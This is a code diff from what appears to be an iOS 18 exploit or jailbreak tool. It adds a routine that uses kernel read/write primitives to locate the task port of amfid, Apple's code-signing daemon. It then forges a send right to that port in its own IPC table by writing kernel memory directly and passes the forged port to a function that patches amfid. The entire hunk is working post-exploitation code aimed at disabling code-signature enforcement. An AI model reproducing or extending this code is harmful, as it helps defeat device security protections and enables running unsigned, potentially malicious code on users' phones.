@@ -271,10 +271,115 @@ final class ExpAmfidNopFinal {
         }
         
         log("")
-        log("  ❌ Cannot get writable task port for amfid")
-        log("  Need kernel task port forge (complex)")
-        log("  Falling back to launchd (may timeout)...")
-        performPatchViaLaunchd(amfidPid: amfidPid)
+        log("  Trying IPC port forge...")
+        log("  (inserting amfid's task port into our IPC space)")
+        
+        // Step 1: Find amfid's task port (ipc_port object)
+        // On iOS 18, the task's self port is at task + itk_space area
+        // We can find it by: our_task → itk_space → table → entry for mach_task_self_ → ie_object
+        // That gives us the ipc_port format. Then find amfid's equivalent.
+        
+        let ourTask = ds_get_our_task()
+        let ourSpace = ds_kreadptr(ourTask + UInt64(off_task_itk_space))
+        log("  our task: 0x\(String(format:"%llx", ourTask))")
+        log("  our ipc_space: 0x\(String(format:"%llx", ourSpace))")
+        
+        guard ourSpace != 0 && (ourSpace >> 32) > 0xFFFFFF00 else {
+            log("❌ our IPC space invalid")
+            performPatchViaLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        // Get our IPC table
+        let ourTable = ds_kreadsmrptr(ourSpace + UInt64(off_ipc_space_is_table))
+        log("  our ipc_table: 0x\(String(format:"%llx", ourTable))")
+        
+        guard ourTable != 0 else {
+            log("❌ our IPC table invalid")
+            performPatchViaLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        // Find amfid's task port object
+        // amfid's task → itk_space → look for the self port
+        let amfidSpace = ds_kreadptr(amfidTask + UInt64(off_task_itk_space))
+        log("  amfid ipc_space: 0x\(String(format:"%llx", amfidSpace))")
+        
+        guard amfidSpace != 0 && (amfidSpace >> 32) > 0xFFFFFF00 else {
+            log("❌ amfid IPC space invalid")
+            performPatchViaLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        // The task's self port is typically at a known port name (e.g., entry index 1 or 2)
+        // Or we can find it by looking for an ipc_port whose kobject == amfidTask
+        let amfidTable = ds_kreadsmrptr(amfidSpace + UInt64(off_ipc_space_is_table))
+        log("  amfid ipc_table: 0x\(String(format:"%llx", amfidTable))")
+        
+        // Scan amfid's IPC table for a port whose kobject == amfidTask
+        var amfidTaskPort: UInt64 = 0
+        let entrySize = UInt64(sizeof_ipc_entry)
+        
+        for i: UInt64 in 1..<20 {
+            let entry = amfidTable + i * entrySize
+            let object = ds_kreadptr(entry + UInt64(off_ipc_entry_ie_object))
+            if object == 0 || (object >> 32) <= 0xFFFFFF00 { continue }
+            let kobject = ds_kreadptr(object + UInt64(off_ipc_port_ip_kobject))
+            if kobject == amfidTask {
+                amfidTaskPort = object
+                log("  ✅ Found amfid task port at entry[\(i)]: 0x\(String(format:"%llx", object))")
+                break
+            }
+        }
+        
+        guard amfidTaskPort != 0 else {
+            log("❌ amfid task port not found in IPC table")
+            performPatchViaLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        // Step 2: Find a free entry in OUR IPC table
+        // Look for an entry with ie_object == 0
+        var freeIdx: UInt64 = 0
+        for i: UInt64 in 10..<200 {  // skip low entries (system ports)
+            let entry = ourTable + i * entrySize
+            let object = ds_kreadptr(entry + UInt64(off_ipc_entry_ie_object))
+            if object == 0 {
+                freeIdx = i
+                log("  Free entry at index \(i)")
+                break
+            }
+        }
+        
+        guard freeIdx != 0 else {
+            log("❌ No free IPC entry found")
+            performPatchViaLaunchd(amfidPid: amfidPid)
+            return
+        }
+        
+        // Step 3: Write amfid's task port into our free entry
+        let targetEntry = ourTable + freeIdx * entrySize
+        // ie_object = amfidTaskPort (PAC-signed write needed?)
+        ds_kwrite64(targetEntry + UInt64(off_ipc_entry_ie_object), amfidTaskPort)
+        // ie_bits: MACH_PORT_TYPE_SEND = 0x00010000, ie_index = 0
+        // On iOS 18: entry format is [ie_object(8)] [ie_bits(4)] [ie_index(4)] [ie_next(4)] ...
+        // ie_bits at offset 0x8, set to MACH_PORT_TYPE_SEND (0x00010000) with 1 make-send count
+        ds_kwrite32(targetEntry + 0x8, 0x00010000 | 0x00010000) // type_send + make_send_count=1
+        
+        // Also need to increment the port's reference count
+        // ipc_port → ip_srights (send rights count) — typically at offset 0x18 or 0x1c
+        let currentSrights = ds_kread32(amfidTaskPort + 0x18)
+        ds_kwrite32(amfidTaskPort + 0x18, currentSrights + 1)
+        
+        // Construct the mach_port_t name: (index << 8) | generation
+        // Generation is in ie_bits[31:24] — for new entry, use 0
+        let portName = mach_port_t(freeIdx << 8) | 0x03  // gen=0, but low bits = 3 for valid name
+        log("  Forged port name: 0x\(String(format:"%x", portName))")
+        
+        // Step 4: Try to use the forged port
+        log("")
+        log("  Testing forged port...")
+        patchAmfidWithPort(taskPort: portName, patchAddr: patchAddr)
     }
     
     private func performPatchViaLaunchd(amfidPid: Int32) {
